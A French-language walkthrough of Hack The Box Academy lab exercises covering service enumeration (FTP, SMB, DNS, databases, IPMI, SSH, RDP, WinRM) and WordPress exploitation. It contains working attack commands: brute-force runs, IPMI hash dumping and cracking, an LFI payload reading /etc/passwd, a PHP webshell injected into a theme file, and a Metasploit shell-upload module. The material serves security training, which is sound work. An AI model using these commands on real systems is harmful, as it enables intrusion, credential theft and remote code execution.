- Kafka/Elastic → ports internes exposés

Les offres d’emploi révèlent :

- bases utilisées : PostgreSQL, SQL Server, Oracle
- frameworks : Spring, ASP.NET, Django
- environnements cloud : Azure, AWS
- outils dev : Jira, Bitbucket

C’est une **carte technique interne gratuite**.

![enum-method33.png](enum-method33.png)

## FTP – version & `flag.txt`

### Trouver la version (bannière complète)

Scan rapide du port FTP (adapté à *ton* IP cible) :

```bash
nmap -sV -sC -p21 <IP_cible>

```

- Dans la section `21/tcp open ftp ...` tu verras un truc du style :
    
    ```
    21/tcp open ftp vsftpd 3.0.3
    
    ```
    
- Ou bien, pour avoir exactement la bannière :

Connexion directe :

```bash
nc -nv <IP_cible> 21
# ou
telnet <IP_cible> 21

```

Tu verras une ligne du genre :

```
220 "Welcome to the HTB Academy vsFTP service."

```

### Se connecter & trouver `flag.txt`

Test du login anonyme :

```bash
ftp <IP_cible>
# username : anonymous
# password : (Entrée)

```

Liste des fichiers :

```
ftp> ls
ftp> ls -R          # si besoin de récursif

```

Cherche un fichier `flag.txt` :

- Il peut être dans le dossier courant ou dans un sous-dossier (`Clients`, `Documents`, etc.)

Télécharger le flag :

```
ftp> get flag.txt
ftp> exit

```

Lire le contenu :

```bash
cat flag.txt

```

## SMB – version, partage, domaine, infos & flag

### Version du serveur SMB (bannière complète)

Scan :

```bash
nmap -sV -sC -p139,445 <IP_cible>

```

Tu verras quelque chose comme :

```
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2

```

### Nom du partage accessible + `flag.txt`

Lister les partages avec `smbclient` (null session) :

```bash
smbclient -N -L //<IP_cible>

```

Tu obtiens :

```
Sharename       Type      Comment
---------       ----      -------
notes           Disk      CheckIT
...

```

 Le partage qui t’intéresse est celui où tu as accès (souvent un `Disk` avec `guest ok`).

Se connecter au partage :

```bash
smbclient //<IP_cible>/<sharename>
# soit il te demande un mot de passe, soit "Anonymous login successful"

```

Lister & récupérer `flag.txt` :

```
smb: \> ls
smb: \> get flag.txt
smb: \> exit

```

Lire le flag :

```bash
cat flag.txt

```

### Domaine, infos de partage, chemin système

### Domaine & infos du serveur

`rpcclient` en null session :

```bash
rpcclient -U "" <IP_cible>
# password : (juste Entrée)

```

Infos serveur :

```
rpcclient $> srvinfo
rpcclient $> querydominfo

```

Ça te donne un truc du style :

```
Domain:         DEVOPS
Server:         DEVSMB

```

Le **nom de domaine** demandé = ce champ `Domain:`.

### Infos détaillées sur un partage spécifique

Toujours dans `rpcclient` :

```
rpcclient $> netshareenumall
rpcclient $> netsharegetinfo <sharename>

```

Tu verras quelque chose comme :

```
netname: notes
        remark: CheckIT
        path:   C:\mnt\notes\
        ...

```

- *“Submit the customized version of that specific share”* → en général, on te demande de renvoyer **exactement** une ligne/structure particulière (souvent ce bloc `netsharegetinfo` ou un champ spécifique, suivant le texte du lab).
- *“Full system path”* → tu prends le `path`, que tu convertis au format Unix **si demandé**.
    - Exemple : `C:\mnt\notes\` ⇒ `/mnt/notes`

👉 Réponses :

- Domaine = valeur du champ `Domain`.
- Détails du partage = ce que `netsharegetinfo` t’affiche.
- Chemin système = ce `path`, adapté au format demandé.

## NFS – trouver les flags dans `nfs` & `nfsshare`

### Énumérer NFS

Nmap :

```bash
nmap -sV -sC -p111,2049 <IP_cible>

```

Lister les exports :

```bash
showmount -e <IP_cible>

```

Tu cherches des lignes du style :

```
/mnt/nfs     10.129.14.0/24
/mnt/nfsshare 10.129.14.0/24

```

### Monter les partages & lire `flag.txt`

Crée un dossier de montage :

```bash
mkdir nfs
sudo mount -t nfs <IP_cible>:/nfs ./nfs -o nolock     # ou /mnt/nfs selon l'export

```

Explore :

```bash
cd nfs
ls -R
cat flag.txt

```

Pour `nfsshare` :

```bash
cd ..
mkdir nfsshare
sudo mount -t nfs <IP_cible>:/nfsshare ./nfsshare -o nolock
cd nfsshare
ls -R
cat flag.txt

```

Nettoyage :

```bash
cd ..
sudo umount ./nfs ./nfsshare

```

## DNS – FQDN, zone transfer, IP de DC1, host x.x.x.203

On suppose que la machine cible est un DNS pour `inlanefreight.htb`.

### FQDN de la cible pour le domaine

Si tu connais l’IP du DNS (ex: `<IP_DNS>`):

```bash
dig -x <IP_DNS> @<IP_DNS>

```

Ou :

```bash
dig any inlanefreight.htb @<IP_DNS>

```

Tu cherches le **nom complet** (FQDN) associé à l’IP de la cible, ex. `ns.inlanefreight.htb`.

### Zone transfer & TXT (HTB{...})

Test AXFR sur le domaine principal :

```bash
dig axfr inlanefreight.htb @<IP_DNS>

```

Si la zone transfer est autorisée, tu verras :

- SOA
- NS
- A
- TXT (avec un `HTB{...}`)

👉 Tu soumets **exactement** le TXT de type `HTB{...}`.

### IP de `DC1`

Si la zone transfer marche déjà, tu la verras dans la sortie précédente. Sinon :

```bash
dig dc1.inlanefreight.htb @<IP_DNS>

```

Tu récupères :

```
dc1.inlanefreight.htb.  IN  A  x.x.x.x

```

👉 Tu soumets cette IPv4.

### FQDN dont l’IP finit par `.203`

Si tu as fait un AXFR sur une zone interne (par ex.) :

```bash
dig axfr internal.inlanefreight.htb @<IP_DNS>

```

Tu cherches dans la sortie :

```
XXX.internal.inlanefreight.htb.  IN  A  x.x.x.203

```

👉 Tu soumets ce **FQDN complet** (ex: `mail1.internal.inlanefreight.htb` si c’est le cas chez toi).

## SMTP – bannière & user existant

### Bannière + version

Scan Nmap :

```bash
nmap -sV -sC -p25 <IP_cible>

```

Tu verras :

```
25/tcp open  smtp  Postfix smtpd
|_smtp-commands: mail1.inlanefreight.htb, ...

```

Pour la bannière brute :

```bash
nc -nv <IP_cible> 25
# ou
telnet <IP_cible> 25

```

Tu obtiens :

```
220 ESMTP Server

```

### Enum user avec `VRFY`

Connexion :

```bash
telnet <IP_cible> 25
# ou
nc -nv <IP_cible> 25

```

Puis :

```
220 ESMTP Server
HELO test
250 ...
VRFY root
VRFY bob
VRFY cry0l1t3

```

- Si le serveur est “honnête”, il renverra une réponse différente pour un user existant (ex : `252 2.0.0` ou `250 2.1.5`) / ou une erreur pour ceux qui n’existent pas.
- Si tous renvoient la même chose (comme dans l’exemple du cours), la question du lab te guidera souvent vers **un user précis trouvé ailleurs** (par exemple via d’autres services).

## IMAP / POP3 (Dovecot)

### Objectifs des questions

- Organisation (subject du certificat)
- FQDN du serveur mail
- Enum IMAP pour trouver un flag
- Version personnalisée POP3 / IMAP
- Admin email
- Lire les mails (flag)

### Méthode

**Scan Nmap des ports mail**

```bash
nmap -sV -sC -p110,143,993,995 <IP>

```

Tu récupères :

- Service (Dovecot imapd / pop3d)
- Certificat SSL (CN, O, L, ST, C)
    - L’organisation = champ `O=...`
    - Le FQDN = champ `CN=...` (ex: `mail1.inlanefreight.htb`)

**Tester les identifiants trouvés (robin:robin)**

Tu peux tester rapidement avec **curl** sur IMAPS (993) :

```bash
curl -k 'imaps://<IP>' --user robin:robin

```

Si ça marche, tu verras la liste des dossiers (`INBOX`, `Important`, etc.).

Avec `-v`, tu vois aussi la bannière (version/custom name) :

```bash
curl -k 'imaps://<IP>' --user robin:robin -v

```

**Interaction en mode “raw” avec openssl**

IMAPS :

```bash
openssl s_client -connect <IP>:993

```

Une fois le banner reçu, tu peux taper les commandes IMAP à la main :

```
A1 LOGIN robin robin
A2 LIST "" *
A3 SELECT INBOX
A4 FETCH 1 all

```

- En fouillant les mails, tu tombes normalement sur un **flag**.
- La **version custom POP3/IMAP** se trouve souvent dans la bannière (ou dans “Server:” côté client).
1. **Admin email**

Souvent visible :

- dans le certificat (`emailAddress=...`)
- ou dans un mail dans la boîte (signature, From, etc.).

## SNMP

### Objectifs

- Email de l’admin
- Version custom du serveur SNMP
- Sortie d’un script custom (flag)

### Méthode

1. **Tester le community string “public”**

```bash
snmpwalk -v2c -c public <IP>

```

Regarde particulièrement les OIDs de base système (`.1.3.6.1.2.1.1`), par exemple :

- `sysContact` → souvent l’**email admin**
- `sysDescr` ou autres → peut contenir une **version custom** ou une chaîne modifiée
1. **Bruteforce de community strings (si “public” ne marche pas)**

```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt <IP>

```

**Bruteforce des OID avec braa**

```bash
braa public@<IP>:.1.3.6.*
```

Tu cherches :

- un OID qui renvoie une **version custom**
- un OID qui renvoie la sortie d’un **script custom** (souvent quelque chose qui ressemble à un message ou directement un `HTB{...}`).

## MySQL

### Objectifs

- Version du MySQL (`MySQL X.X.XX`)
- Avec `robin:robin`, récupérer l’email de **Otto Lang**

### Méthode

**Scan Nmap MySQL**

```bash
nmap -sV -sC -p3306 <IP> --script mysql*

```

Tu verras :

- la **version** (`mysql-info` → `Version: 8.0.xx-...`)
    - Formate-la comme demandé : `MySQL X.X.XX`

**Connexion avec les creds robin:robin**

```bash
mysql -u robin -probin -h <IP>

```

**Enumération des bases**

```sql
SHOW DATABASES;
USE <db_interessante>;
SHOW TABLES;

```

**Trouver Otto Lang**

Repère une table qui ressemble à des users/clients (ex : `customers`, `users`, etc.), regarde la structure, puis :

```sql
SHOW COLUMNS FROM <table>;
SELECT * FROM <table> WHERE name = "Otto Lang";

```

Ou si le nom est séparé :

```sql
SELECT * FROM <table> WHERE firstname = "Otto" AND lastname = "Lang";

```

Récupère le champ `email`.

## MSSQL

### Objectifs

- Hostname du serveur MSSQL
- Nom de la base non par défaut avec `backdoor:Password1`

### Méthode

**Scan Nmap MSSQL**

```bash
nmap -sV -p1433 --script ms-sql-info,ms-sql-ntlm-info <IP>

```

Tu récupères :

- `Windows server name` → **hostname**
- Infos d’instance (MSSQLSERVER, version, etc.)

**Connexion avec mssqlclient.py**

```bash
python3 mssqlclient.py backdoor@<IP> -windows-auth
# ou si SQL auth :
python3 mssqlclient.py backdoor:Password1@<IP>

```

**Lister les bases**

```sql
select name from sys.databases;

```

Tu ignores les bases système (`master`, `model`, `msdb`, `tempdb`) et tu relèves le **nom de la base non par défaut**.

## Oracle TNS

### Objectif

- Hash du user `DBSNMP`

### Méthode

**Scan Nmap TNS**

```bash
nmap -sV -p1521 <IP> --open

```

**Bruteforce du SID**

```bash
nmap -p1521 -sV <IP> --script oracle-sid-brute

```

Tu récupères un SID (souvent `XE` dans les exemples).

**Utiliser ODAT pour trouver des creds**

```bash
./odat.py all -s <IP>

```

Note des couples login/pass valides (par ex. `scott/tiger`).

**Connexion avec sqlplus**

```bash
sqlplus scott/tiger@<IP>/<SID>
# ou avec plus de droits
sqlplus scott/tiger@<IP>/<SID> as sysdba

```

**Récupérer le hash de DBSNMP**

```sql
SELECT name, password FROM sys.user$ WHERE name='DBSNMP';

```

Tu soumets le hash tel quel (format demandé par l’énoncé).

## IPMI

### Objectifs

- Username IPMI
- Mot de passe en clair

### Méthode

**Scan Nmap IPMI**

```bash
nmap -sU --script ipmi-version -p623 <IP>

```

Confirme que IPMI v2.0 tourne sur le port 623/UDP.

**Dump des hashes avec Metasploit**

```
use auxiliary/scanner/ipmi/ipmi_dumphashes
set RHOSTS <IP>
run

```

Le module affiche :

- l’utilisateur (souvent `ADMIN`)
- le hash, et parfois le mot de passe déjà cracké (surtout pour `ADMIN` / `ADMIN` ou autre valeur triviale).
1. **Sinon, cracker le hash (Hashcat m=7300)**

Si besoin :

```bash
hashcat -m 7300 ipmi_hashes.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u

```

# Recon global

Avant de se jeter sur SSH/RDP/WinRM, toujours commencer par un scan :

```bash
nmap -sC -sV -p- <IP>

```

Repère surtout :

- **Linux remote mgmt**
    - `22/tcp` → SSH
    - `873/tcp` → rsync
    - `512, 513, 514/tcp` → r-services (rexec, rlogin, rsh)
- **Windows remote mgmt**
    - `3389/tcp` → RDP
    - `5985/tcp` → WinRM (HTTP)
    - `5986/tcp` → WinRM (HTTPS)
    - `135/tcp` → WMI / DCOM

Ensuite tu affines par service.

# Linux Remote Management

## SSH

### a) Footprinting / version

Scan ciblé :

```bash
nmap -sV -p22 <IP>

```

Ou avec **ssh-audit** :

```bash
git clone https://github.com/jtesta/ssh-audit.git
cd ssh-audit
./ssh-audit.py <IP>

```

Tu récupères :

- **Bannière** : `SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3`
- Version SSH → utile pour chercher d’éventuels CVE
- Algo KEX, host keys, ciphers, etc.

### Auth methods & brute potentiel

Teste une connexion verbeuse :

```bash
ssh -v user@<IP>

```

Regarde la ligne :

```
Authentications that can continue: publickey,password,keyboard-interactive

```

Si `password` est présent → brute-force possible (hydra, etc.).

Pour forcer l’auth password (pratique pour hydra) :

```bash
ssh -v user@<IP> -o PreferredAuthentications=password

```

Tu pourras ensuite (en théorie) lancer un bruteforce :

```bash
hydra -l user -P wordlist.txt ssh://<IP>

```

*(À adapter aux règles du lab / engagement évidemment.)*

### c) Points de config “dangereux” (côté théorie / exam)

Dans `/etc/ssh/sshd_config`, les options à surveiller :

- `PermitRootLogin yes`
- `PasswordAuthentication yes`
- `PermitEmptyPasswords yes`
- `Protocol 1`
- `X11Forwarding yes` (anciennement vulnérable)
- `AllowTcpForwarding yes`, `PermitTunnel` (pivot facile)

Dans un vrai audit, tu cherches ces options pour du **hardening** ou des vecteurs d’attaque (brute-force, root login direct, etc.).

## Rsync

### Détection

```bash
nmap -sV -p873 <IP>

```

Exemple de résultat :

```
873/tcp open  rsync   (protocol version 31)

```

### Voir les modules disponibles

Connexion brute avec `nc` :

```bash
nc -nv <IP> 873

```

Tu verras :

```
@RSYNCD: 31.0
@RSYNCD: 31.0
#list
dev             Dev Tools
@RSYNCD: EXIT

```

Ici, `dev` est un **module** (un “share rsync”).

### Lister le contenu d’un module

```bash
rsync -av --list-only rsync://<IP>/dev

```

Tu cherches ce genre de choses :

- `secrets.yaml`, `.env`, `config.php`
- Répertoires `.ssh` (clé privée, known_hosts, etc.)
- Scripts, backups, dumps

### Récupérer les fichiers

```bash
rsync -av rsync://<IP>/dev ./loot_rsync

```

Puis tu fouilles localement.

Souvent, un rsync mal configuré → fuite de clés SSH → accès SSH → escalade.

## R-Services (rexec, rlogin, rsh)

### Détection

```bash
nmap -sV -p512,513,514 <IP>

```

Exemple :

```
512/tcp open  exec?
513/tcp open  login?
514/tcp open  tcpwrapped

```

Ça indique la présence des **r-services**.

### Comprendre la confiance (hosts.equiv / .rhosts)

- `/etc/hosts.equiv` → global (pour tout le système)
- `~user/.rhosts` → par utilisateur

Syntaxe typique :

```
# /etc/hosts.equiv
pwnbox cry0l1t3

```

ou :

```
# ~/.rhosts
htb-student     10.0.17.5
+               10.0.17.10
+               +

```

`+` = wildcard → host/user de conf **ultra dangereuse** (accès sans mot de passe).

### Exploiter avec rlogin / rsh

Si ton host/IP est “trusted”, tu peux tenter :

```bash
rlogin <IP> -l htb-student

```

Si ça passe, tu as un shell **sans mot de passe** 👀

### Enum des utilisateurs loggés

Une fois sur la machine (ou depuis ton réseau si les services sont actifs) :

```bash
rwho
rusers -al <IP>

```

Tu obtiens :

- utilisateurs
- hosts sur lesquels ils sont connectés
- TTY, heure de login

C’est précieux pour de la **lateral movement** et de l’énumération d’AD.

# Windows Remote Management

## RDP (3389)

### Footprinting avec Nmap

```bash
nmap -sV -sC -p3389 --script rdp* <IP>

```

Tu récupères :

- `Target_Name` / `DNS_Computer_Name` → hostname (ex: `ILF-SQL-01`)
- `Product_Version` → version Windows (ex: `10.0.17763`)
- Info de sécurité RDP (NLA/CredSSP activé ou pas)

### rdp-sec-check (optionnel mais stylé)

```bash
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git
cd rdp-sec-check
./rdp-sec-check.pl <IP>

```

Ça te dit :

- quels protocoles RDP sont supportés
- si RDP Security (ancien) est activé
- si TLS / CredSSP obligatoire (NLA)

### Connexion avec xfreerdp

Si tu as des creds :

```bash
xfreerdp /u:USER /p:"PASSWORD" /v:<IP>

```

Tu verras possiblement une alerte cert :

- CN = nom du serveur (`ILF-SQL-01`)
- Cert self-signed → classique

Une fois accepté → bureau à distance = pivot graphique.

## WinRM (5985 / 5986)

### Détection

```bash
nmap -sV -sC -p5985,5986 <IP> --disable-arp-ping -n

```

Typique :

```
5985/tcp open  http    Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)

```

### Connexion avec evil-winrm

Avec des identifiants valides (souvent un user de domaine / local avec droits RDP/WinRM) :

```bash
evil-winrm -i <IP> -u USER -p 'Password123!'

```

Tu obtiens un prompt PowerShell style :

```
*Evil-WinRM* PS C:\Users\USER\Documents>

```

Depuis là tu peux :

- Énumérer la machine (`whoami`, `hostname`, `ipconfig`, `Get-LocalUser`, etc.)
- Upload / download (`upload`, `download`)
- Lancer des scripts PowerShell (recon, privesc, etc.)

WinRM = **RCE propre** sur Windows.

## WMI (via Impacket)

WMI communique via :

- **TCP 135** pour init
- puis port aléatoire haut (DCOM)

Avec des creds valides :

```bash
python3 /usr/share/doc/python3-impacket/examples/wmiexec.py USER:'Password123!'@<IP> "hostname"

```

Exemple de sortie :

```
[*] SMBv3.0 dialect used
ILF-SQL-01

```

Sans commander à la fin, tu peux aussi obtenir un pseudo-shell “semi-interactif” (type cmd).

WMI est utile quand :

- RDP est filtré / WinRM off
- mais SMB + RPC sont accessibles.

## **Hacking WordPress**

## Directory Indexing → Trouver `flag.txt` (question de la page 6)

> « …Enumérez manuellement la cible pour tous les répertoires dont le contenu peut être listé… localisez un flag nommé flag.txt… »
> 

### Ce qu’ils veulent que tu apprennes

- Connaître les **répertoires clés d’un WordPress** :
    - `/wp-content/`
    - `/wp-content/plugins/`
    - `/wp-content/themes/`
    - `/wp-content/uploads/`
    - Parfois `/wp-includes/` ou d’autres dossiers exposés
- Vérifier si l’**indexation de répertoire** est activée (pages d’index auto d’Apache)
- Parcourir ces répertoires jusqu’à trouver **`flag.txt`**

### Comment faire (navigateur ou CLI)

On suppose que ta cible est `http://TARGET` (remplace par l’URL/IP HTB).

Essaie d’afficher les chemins WordPress classiques dans le **navigateur** :

- `http://TARGET/wp-content/`
- `http://TARGET/wp-content/plugins/`
- `http://TARGET/wp-content/themes/`
- `http://TARGET/wp-content/uploads/`

Si l’indexation est activée, tu verras une page de type index Apache :

> Index of /wp-content/plugins/
> 
> 
> [DIR] some-plugin/
> 

Fais la même chose en **CLI** avec `curl` + `html2text` sur ta box Parrot :

```bash
# Exemple : énumérer les plugins
curl -s -X GET http://TARGET/wp-content/plugins/ | html2text

# Puis descendre dans les répertoires intéressants
curl -s -X GET http://TARGET/wp-content/plugins/some-plugin/ | html2text

```

Parcours tous les répertoires dont le contenu est listé (plugins, themes, uploads, etc.) jusqu’à tomber sur `flag.txt` :

```bash
curl -s -X GET http://TARGET/wp-content/uploads/ | html2text
curl -s -X GET http://TARGET/wp-content/uploads/2025/ | html2text
# …continue partout où tu vois des sous-dossiers…

```

Une fois que tu vois `flag.txt` dans un listing, récupère son contenu :

```bash
curl -s http://TARGET/path/to/flag.txt

```

Le **contenu de ce fichier** est la réponse à soumettre.

## Énumération des utilisateurs → User ID 2 (question de la page 7)

> « À partir de la dernière commande cURL, quel nom d’utilisateur est associé à l’ID utilisateur 2 ? »
> 

Ils montrent l’exemple d’énumération via l’API JSON :

```bash
curl http://blog.inlanefreight.com/wp-json/wp/v2/users | jq

```

Et un extrait :

```json
[
  {
    "id": 1,
    "name": "admin",
    ...
  },
  {
    "id": 2,
    "name": "ch4p",
    ...
  }
]

```

Sur **ta** cible, tu fais la même chose :

```bash
curl http://TARGET/wp-json/wp/v2/users | jq

```

Ensuite :

- Cherche l’objet où `"id": 2`
- Lis le champ `"name"` – cette **valeur est le nom d’utilisateur demandé**

Dans l’exemple du texte, c’est `ch4p`, mais sur le lab Academy ça peut être autre chose, donc base-toi sur *ton* output.

## XML-RPC → « Exécuter tous les appels de méthodes » & les compter (question de la page 8)

> « Cherchez “WordPress xmlrpc attacks” et trouvez comment l’utiliser pour exécuter tous les appels de méthodes. Indiquez le nombre de méthodes possibles sur votre cible. »
> 

Cette partie concerne l’abus de **`xmlrpc.php`** et des **méthodes XML-RPC** qu’il expose.

### Concepts clés

- `xmlrpc.php` implémente un tas de méthodes comme :
    - `wp.getUsersBlogs`
    - `wp.getPosts`
    - `system.listMethods`
    - `system.multicall` (permet d’exécuter plusieurs appels en une seule requête)

L’idée ici est :

1. Interroger XML-RPC pour la liste de **toutes les méthodes supportées**
2. Les compter
3. Utiliser ce nombre comme réponse

### Étape 1 – Vérifier que `xmlrpc.php` est accessible

```bash
curl -s -I http://TARGET/xmlrpc.php

```

Si c’est activé, tu auras un `200 OK` ou une réponse XML-RPC spécifique.

### Étape 2 – Lister toutes les méthodes

Utilise la méthode intégrée `system.listMethods` :

```bash
curl -s -X POST http://TARGET/xmlrpc.php \
  -d '<?xml version="1.0"?>
  <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
  </methodCall>'

```

Tu obtiendras une réponse XML contenant toutes les méthodes supportées dans un bloc `<array><data>...</data></array>`.

Pour faciliter le comptage :

```bash
curl -s -X POST http://TARGET/xmlrpc.php \
  -d '<?xml version="1.0"?>
  <methodCall>
    <methodName>system.listMethods</methodName>
    <params></params>
  </methodCall>' \
  | grep -o '<string>.*</string>' \
  | wc -l

```

- Le résultat de `wc -l` est ton **« nombre d’appels de méthodes possibles »** pour cette cible.

### Étape 3 – « Exécuter tous les appels de méthodes »

La phrase « l’utiliser pour exécuter tous les appels de méthodes » fait en général référence à **`system.multicall`**, qui permet d’envoyer plusieurs appels de méthodes dans une seule requête. Conceptuellement :

```xml
<methodCall>
  <methodName>system.multicall</methodName>
  <params>
    <param>
      <value>
        <array>
          <data>
            <value>
              <struct>
                <member>
                  <name>methodName</name>
                  <value><string>wp.getUsersBlogs</string></value>
                </member>
                <member>
                  <name>params</name>
                  <value>
                    <array>
                      <data>
                        <value><string>username</string></value>
                        <value><string>password</string></value>
                      </data>
                    </array>
                  </value>
                </member>
              </struct>
            </value>
            <!-- Ajouter d’autres structures de méthodes ici -->
          </data>
        </array>
      </value>
    </param>
  </params>
</methodCall>

```

Tu n’es pas obligé de vraiment exécuter toutes les méthodes pour répondre à la question ; ils veulent surtout que tu :

- Saches que `system.listMethods` existe
- Saches que `system.multicall` existe et peut chaîner plusieurs méthodes
- Utilises `system.listMethods` pour compter les méthodes

## WPScan → Version du plugin vulnérable `photo-gallery` (question de la page 10)

> « Énumérez l’instance WordPress fournie pour tous les plugins installés… soumettez la version du plugin vulnérable nommé photo-gallery. »
> 

### Étape 1 – Configurer le token API WPScan (si nécessaire)

1. Crée un compte sur wpscan.com / wpvulndb.com
2. Récupère ton **API token**
3. Sur Parrot, WPScan est déjà installé. Vérifie :
    
    ```bash
    wpscan --hh
    
    ```
    

### Étape 2 – Lancer l’énumération des plugins sur la cible

Utilise l’URL HTB à la place de l’exemple :

```bash
wpscan --url http://TARGET \
       --enumerate ap \
       --api-token YOUR_API_TOKEN

```

- `-enumerate ap` = **tous les plugins**
- Tu peux ajouter `t 10` pour plus de threads :
    
    ```bash
    wpscan --url http://TARGET --enumerate ap -t 10 --api-token YOUR_API_TOKEN
    
    ```
    

### Étape 3 – Trouver `photo-gallery` dans la sortie

Dans les résultats, tu verras des blocs du style :

```
[+] photo-gallery
 | Location: http://TARGET/wp-content/plugins/photo-gallery/
 | Latest Version: X.Y.Z (maybe out of date)
 | Installed Version: X.Y.Z
 | [!] Vulnerabilities identified:
 |   ...

```

La **“Installed Version”** (ou la version affichée pour ce plugin) est la réponse à soumettre.

Pour ne voir que ce plugin :

```bash
wpscan --url http://TARGET --enumerate ap --api-token YOUR_API_TOKEN | grep -i -A 5 'photo-gallery'

```

## Récap rapide / modèle mental

- **Directory indexing** : Navigue ou utilise `curl` sur les répertoires WordPress clés. Si l’indexation est activée, explore l’arborescence jusqu’à trouver `flag.txt`.
- **Énumération d’utilisateurs** :
    - Méthode ancienne : `/?author=1`, `/?author=2`, etc.
    - Méthode moderne : `curl http://TARGET/wp-json/wp/v2/users | jq` et regarde `id` / `name`.
- **XML-RPC** :
    - `xmlrpc.php` est une feature, mais souvent abusée.
    - `system.listMethods` liste toutes les méthodes → tu les comptes.
    - `system.multicall` permet d’enchaîner plusieurs appels en une seule requête.
- **WPScan** :
    - Utilise `-enumerate` avec les bons switches (`ap`, `vp`, `u`, etc.) selon ton objectif.
    - Pour la version d’un plugin vulnérable, cherche son bloc dans la sortie et lis la version installée.

### Contexte

WPScan t’a indiqué un plugin vulnérable :

- **Mail Masta 1.0**
- Vulnérable à **LFI** (Local File Inclusion) et **SQLi**
- PoC LFI :
    
    `/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`
    

L’objectif de la question :

> Utiliser cette vulnérabilité LFI sur ta cible pour lire /etc/passwd, puis trouver l’unique utilisateur non-root ayant un shell de login.
> 

### Étapes

Teste la LFI sur ta cible :

```bash
curl "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"

```

Si c’est vulnérable, tu devrais voir un contenu ressemblant à :

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
...
wp-user:x:1000:1000:...,/home/wp-user:/bin/bash

```

Comprendre ce que tu cherches :

- Un **user non-root**
- Avec un **vrai shell de login**, typiquement `/bin/bash` ou `/bin/sh`
- Et **le seul** dans ce cas

Tu peux filtrer proprement en local si tu veux :

```bash
curl -s "http://TARGET/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd" \
  | grep -E "(/bin/bash|/bin/sh)"

```

- Ignore la ligne `root:...:/bin/bash`
- Il ne devrait rester **qu’un** autre utilisateur (ex: `wp-user`)

👉 **Le nom de cet utilisateur** est la réponse à soumettre.

## Attaque par bruteforce sur l’utilisateur `roger`

*(Page 12 – WPScan password attack avec rockyou)*

La question :

> Lancer une attaque de bruteforce contre l’utilisateur roger avec le wordlist rockyou.txt et soumettre le mot de passe trouvé.
> 

### Pré-requis

- Avoir **enumeré les utilisateurs** auparavant (WPScan ou `/wp-json/wp/v2/users`)
- Avoir le fichier `rockyou.txt`, typiquement ici :
    
    `/usr/share/wordlists/rockyou.txt` (pense à le décompresser si besoin : `gunzip`)
    

### Commande WPScan

On utilise la méthode `xmlrpc` (plus rapide) :

```bash
wpscan --url http://TARGET \
       --password-attack xmlrpc \
       -U roger \
       -P /usr/share/wordlists/rockyou.txt \
       -t 20

```

- `-password-attack xmlrpc` : attaque via `xmlrpc.php`
- `U roger` : utilisateur ciblé
- `P` : wordlist
- `t 20` : 20 threads

### Lecture du résultat

WPScan va afficher quelque chose du genre :

```
[+] Performing password attack on Xmlrpc against 1 user/s

[SUCCESS] - roger / MotDePasseTrouvé
...
[i] Valid Combinations Found:
 | Username: roger, Password: MotDePasseTrouvé

```

## RCE via l’éditeur de thème (Theme Editor – Webshell)

*(Page 13 – RCE + flag dans /home/wp-user/flag.txt)*

La question :

> Utiliser les identifiants admin [admin:sunshine1], uploader un webshell et récupérer le contenu de flag.txt dans le home de wp-user.
> 

### Étape 1 – Connexion à WordPress

Va sur la page de login :

- `http://TARGET/wp-login.php`
    
    ou
    
- `http://TARGET/wp-admin/`

Connecte-toi avec :

- **Username** : `admin`
- **Password** : `sunshine1`

Tu arrives sur le **dashboard /wp-admin**.

### Étape 2 – Ouverture de l’éditeur de thème

Dans le menu de gauche :

**Appearance → Theme Editor** (*Apparence → Éditeur de thème*)

Identifie :

- Le **thème actif** (à éviter de casser)
- Un **thème inactif** (ex : `Twenty Seventeen`, `Twenty Twenty`, etc.) – c’est lui qu’on va modifier

En haut à droite, choisis un thème inactif dans le menu déroulant, puis clique sur **Select**.

### Étape 3 – Injection d’un webshell dans 404.php

1. Dans la liste de fichiers du thème (à droite), clique sur **404.php**.
2. Ajoute une ligne de webshell au tout début du fichier, par exemple :

```php
<?php
system($_GET['cmd']);
/**
 * The template for displaying 404 pages (not found)
 * ...

```

Clique sur **Update File** / **Mettre à jour le fichier**.

### Étape 4 – Tester la RCE

Appelle ton shell avec un paramètre `cmd` :

```bash
curl "http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=id"

```

Tu dois voir un output du style :

```
uid=1000(wp-user) gid=1000(wp-user) groups=1000(wp-user)

```

### Étape 5 – Récupérer le flag dans le home de `wp-user`

On va utiliser le même `cmd` pour parcourir le système :

1. Lister les home directories :

```bash
curl "http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home"

```

Tu devrais voir `wp-user`.

1. Lister le contenu du home de `wp-user` :

```bash
curl "http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=ls%20/home/wp-user"

```

1. Une fois que tu vois `flag.txt`, lis-le :

```bash
curl "http://TARGET/wp-content/themes/twentyseventeen/404.php?cmd=cat%20/home/wp-user/flag.txt"

```

## Exploitation automatique avec Metasploit

*(Page 14 – `wp_admin_shell_upload`)*

Pas forcément une question directe ici, mais très utile pour la suite ou un Skills Assessment.

### Objectif

Utiliser le module MSF :

- `exploit/unix/webapp/wp_admin_shell_upload`

pour :

- se connecter avec un compte WordPress admin
- uploader un shell
- obtenir une **session Meterpreter** (ou shell)

### Étapes

Lancer Metasploit :

```bash
msfconsole

```

Chercher le module :

```
msf6 > search wp_admin

```

Utiliser le module :

```
msf6 > use exploit/unix/webapp/wp_admin_shell_upload
msf6 exploit(unix/webapp/wp_admin_shell_upload) >

```

Afficher les options :

```
msf6 exploit(unix/webapp/wp_admin_shell_upload) > options

```

Configurer les paramètres essentiels :

```
set RHOSTS TARGET
set TARGETURI /
set USERNAME admin
set PASSWORD sunshine1        # ou autre si tes creds sont différents
set LHOST 10.10.x.x           # ton IP VPN HTB
set RPORT 80                  # ou 443 si HTTPS

```

Lancer l’exploit :

```
run

```

